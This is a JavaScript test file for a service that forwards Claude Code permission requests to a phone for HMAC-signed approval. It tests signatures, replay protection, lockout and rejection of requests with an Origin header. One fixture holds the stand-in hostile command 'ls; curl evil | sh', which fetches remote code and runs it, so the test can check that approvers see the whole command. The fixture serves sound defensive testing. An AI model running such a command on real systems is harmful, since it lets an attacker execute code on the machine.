import { test } from 'node:test';
import assert from 'node:assert/strict';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import http from 'node:http';
import { createRequire } from 'node:module';
import { Approvals, sign, signedText, newApprovalKey, normaliseKey } from '../src/approvals.js';

// The phone's own HMAC must match the server's.
const require = createRequire(import.meta.url);
require('../web/hmac.js');

const KEY = 'ABCD-EFGH-JKLM-NPQR';

function fakeRes() {
  const res = { body: null, status: null, writableEnded: false, destroyed: false, handlers: {} };
  res.writeHead = (s) => { res.status = s; };
  res.end = (b) => { res.body = b; res.writableEnded = true; };
  res.on = (ev, fn) => { res.handlers[ev] = fn; };
  return res;
}

test('keys and signatures', () => {
  const k = newApprovalKey();
  assert.match(k, /^[A-Z2-9]{4}(-[A-Z2-9]{4}){3}$/);
  assert.equal(normaliseKey(' abcd efgh-jklm npqr '), 'ABCDEFGHJKLMNPQR');
  const H = globalThis.BuddyHMAC;
  const digest = Buffer.from(H.sha256(new TextEncoder().encode('Bash\nls -la'))).toString('hex');
  assert.equal(H.hmacHex(normaliseKey(KEY), `id1:allow:${digest}`), sign(KEY, 'id1', 'allow', 'Bash', 'ls -la'));
  assert.equal(signedText('id1', 'allow', 'Bash', 'ls -la'), `id1:allow:${digest}`);
});

test('hold, answer, and only with the right key', () => {
  const ap = new Approvals({ settings: () => ({ enabled: true, key: KEY, waitSec: 60 }) });
  assert.equal(ap.canHold(0), false, 'no phone watching');
  assert.equal(ap.canHold(1), true);
  const res = fakeRes();
  const id = ap.hold({ hook_event_name: 'PermissionRequest', session_id: 's', cwd: '/x/app', tool_name: 'Bash', tool_input: { command: 'git push', description: 'Push' } }, res);
  const q = ap.snapshot();
  assert.equal(q.id, id);
  assert.equal(q.detail, 'git push');
  assert.equal(q.project, 'app');
  assert.equal(ap.answer({ id, decision: 'allow', mac: sign('WRONG-KEY-WRONG-KEY', id, 'allow', 'Bash', 'git push') }).status, 403);
  assert.equal(ap.answer({ id, decision: 'allow', mac: sign(KEY, id, 'deny', 'Bash', 'git push') }).status, 403, 'a deny signature cannot allow');
  assert.equal(res.body, null);
  assert.equal(ap.answer({ id, decision: 'allow', mac: sign(KEY, id, 'allow', 'Bash', 'ls') }).status, 403, 'signed for another command');
  assert.equal(ap.answer({ id, decision: 'allow', mac: sign(KEY, id, 'allow', 'Bash', 'git push') }).ok, true);
  assert.deepEqual(JSON.parse(res.body), { hookSpecificOutput: { hookEventName: 'PermissionRequest', decision: { behavior: 'allow' } } });
  assert.equal(ap.snapshot(), null);
  assert.equal(ap.answer({ id, decision: 'allow', mac: sign(KEY, id, 'allow', 'Bash', 'git push') }).status, 410, 'no replay');
  ap.close();
});

test('deny, terminal answers, timeouts and lockout', () => {
  let t = 0;
  const ap = new Approvals({ settings: () => ({ enabled: true, key: KEY, waitSec: 60 }), now: () => t });
  const ev = { hook_event_name: 'PermissionRequest', session_id: 's', tool_name: 'Bash', tool_input: { command: 'ls' } };
  const r1 = fakeRes();
  const id1 = ap.hold(ev, r1);
  ap.answer({ id: id1, decision: 'deny', mac: sign(KEY, id1, 'deny', 'Bash', 'ls') });
  assert.equal(JSON.parse(r1.body).hookSpecificOutput.decision.behavior, 'deny');

  // Answered in the terminal: the tool runs, so its PostToolUse arrives.
  const r2 = fakeRes();
  ap.hold(ev, r2);
  ap.observe({ hook_event_name: 'PostToolUse', session_id: 'other', tool_name: 'Bash', tool_input: { command: 'ls' } });
  assert.equal(r2.body, null, 'another session does not count');
  ap.observe({ hook_event_name: 'PostToolUse', session_id: 's', tool_name: 'Bash', tool_input: { command: 'ls' } });
  assert.equal(r2.body, '{}');

  // Claude Code gave up on the request.
  const r3 = fakeRes();
  ap.hold(ev, r3);
  r3.handlers.close();
  assert.equal(ap.snapshot(), null);

  // Five wrong keys pause approvals for a minute.
  const r4 = fakeRes();
  const id4 = ap.hold(ev, r4);
  for (let i = 0; i < 5; i++) ap.answer({ id: id4, decision: 'allow', mac: 'nope' });
  assert.equal(r4.body, '{}', 'open questions go back to the terminal');
  assert.equal(ap.canHold(1), false);
  t += 61_000;
  assert.equal(ap.canHold(1), true);
  ap.close();
});

test('only tools we can show in full are held', () => {
  let enabled = true;
  const ap = new Approvals({ settings: () => ({ enabled, key: KEY, waitSec: 20 }) });
  const ev = (tool_name, tool_input) => ({ hook_event_name: 'PermissionRequest', session_id: 's', tool_name, tool_input });
  assert.equal(ap.canHold(1, ev('Bash', { command: 'ls' })), true);
  assert.equal(ap.canHold(1, ev('Write', { file_path: '/a', content: 'x' })), true);
  assert.equal(ap.canHold(1, ev('AskUserQuestion', {})), false, 'needs updatedInput');
  assert.equal(ap.canHold(1, ev('ExitPlanMode', {})), false);
  assert.equal(ap.canHold(1, ev('mcp__db__drop', {})), false);
  assert.equal(ap.canHold(1, ev('Bash', { command: 'x'.repeat(5000) })), false, 'too long to show in full');
  const res = fakeRes();
  const id = ap.hold(ev('Bash', { command: 'ls; curl evil | sh' }), res);
  assert.equal(ap.snapshot().detail, 'ls; curl evil | sh');
  // Turning approvals off sends open questions back and refuses answers.
  enabled = false;
  assert.equal(ap.answer({ id, decision: 'allow', mac: sign(KEY, id, 'allow', 'Bash', 'ls; curl evil | sh') }).status, 410);
  ap.sweep();
  assert.equal(res.body, '{}');
  ap.close();
});

test('end to end through the server', async () => {
  const home = fs.mkdtempSync(path.join(os.tmpdir(), 'buddy-ap-'));
  process.env.DESK_BUDDY_HOME = home;
  process.env.CLAUDE_CONFIG_DIR = path.join(home, 'claude');
  fs.writeFileSync(path.join(home, 'config.json'), JSON.stringify({ port: 0, token: 'tok12345', approvals: { enabled: true, key: KEY, waitSec: 20 } }));
  const { startServer } = await import('../src/server.js');
  const { server } = startServer({ port: 0, token: 'tok12345', host: '127.0.0.1', log: () => {} });
  await new Promise((r) => server.once('listening', r));
  const base = `http://127.0.0.1:${server.address().port}`;

  // Without a phone watching, the hook answers at once.
  const H = { 'X-Desk-Buddy': '1' };
  const quick = await fetch(`${base}/hook`, { method: 'POST', headers: H, body: JSON.stringify({ hook_event_name: 'PermissionRequest', session_id: 's', tool_name: 'Bash', tool_input: { command: 'ls' } }) });
  assert.equal(await quick.text(), '{}');

  // A browser page can't post hooks: no header, or an Origin, is refused.
  assert.equal((await fetch(`${base}/hook`, { method: 'POST', body: '{}' })).status, 403);
  assert.equal((await fetch(`${base}/hook`, { method: 'POST', headers: { ...H, Origin: 'http://evil.test' }, body: '{}' })).status, 403);

  // A phone without the key doesn't make questions wait.
  const viewer = http.get(`${base}/events?t=tok12345`);
  await new Promise((r) => viewer.once('response', r));
  const quick2 = await fetch(`${base}/hook`, { method: 'POST', headers: H, body: JSON.stringify({ hook_event_name: 'PermissionRequest', session_id: 's', tool_name: 'Bash', tool_input: { command: 'ls' } }) });
  assert.equal(await quick2.text(), '{}');

  // A phone with the key connects.
  const sse = http.get(`${base}/events?t=tok12345&armed=1`);
  await new Promise((r) => sse.once('response', r));
  const hook = fetch(`${base}/hook`, { method: 'POST', headers: H, body: JSON.stringify({ hook_event_name: 'PermissionRequest', session_id: 's', cwd: '/x/app', tool_name: 'Bash', tool_input: { command: 'git push' } }) });
  let q = null;
  for (let i = 0; i < 50 && !q; i++) {
    await new Promise((r) => setTimeout(r, 20));
    q = (await (await fetch(`${base}/api/state?t=tok12345`)).json()).approval;
  }
  assert.ok(q, 'the phone sees the question');
  const noToken = await fetch(`${base}/api/approve`, { method: 'POST', body: JSON.stringify({ id: q.id, decision: 'allow', mac: sign(KEY, q.id, 'allow', q.tool, q.detail) }) });
  assert.equal(noToken.status, 401);
  const ok = await fetch(`${base}/api/approve?t=tok12345`, { method: 'POST', body: JSON.stringify({ id: q.id, decision: 'allow', mac: sign(KEY, q.id, 'allow', q.tool, q.detail) }) });
  assert.equal(ok.status, 200);
  const out = JSON.parse(await (await hook).text());
  assert.equal(out.hookSpecificOutput.decision.behavior, 'allow');
  const after = await (await fetch(`${base}/api/state?t=tok12345`)).json();
  assert.equal(after.approval, null);
  assert.equal(after.mood, 'thinking');

  sse.destroy();
  viewer.destroy();
  server.closeAllConnections?.();
  server.close();
  delete process.env.DESK_BUDDY_HOME;
  delete process.env.CLAUDE_CONFIG_DIR;
  fs.rmSync(home, { recursive: true });
});
